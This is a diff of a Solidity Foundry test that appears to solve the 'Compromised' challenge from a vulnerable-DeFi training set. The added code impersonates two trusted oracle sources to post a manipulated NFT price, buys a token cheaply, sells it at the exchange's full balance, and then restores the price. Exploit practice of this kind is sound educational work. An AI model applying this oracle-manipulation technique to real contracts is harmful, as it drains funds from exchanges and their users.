@@ -76,9 +76,48 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        address s1 = 0xA73209FB1a42495120166736362A1DfA9F95A105;
+        address s2 = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
+        string memory symbol = "DVNFT";
+        uint256 price = 0.1 ether;
+
+        setPrice(s1, symbol, price);
+        setPrice(s2, symbol, price);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        vm.stopPrank();
+
+        uint256 exchangeBalance = payable(exchange).balance;
+
+        setPrice(s1, symbol, exchangeBalance);
+        setPrice(s2, symbol, exchangeBalance);
+
+        // damnValuableNFT.approve(address(exchange), tokenId);
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        emit log_named_address(
+            "the owner of token is:",
+            damnValuableNFT.ownerOf(tokenId)
+        );
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        setPrice(s1, symbol, INITIAL_NFT_PRICE);
+        setPrice(s2, symbol, INITIAL_NFT_PRICE);
 
         /** EXPLOIT END **/
         validation();
+    }
+
+    function setPrice(
+        address s,
+        string memory symbol,
+        uint256 price
+    ) internal {
+        vm.startPrank(s);
+        trustfulOracle.postPrice(symbol, price);
+        vm.stopPrank();
     }
 
     function validation() internal {
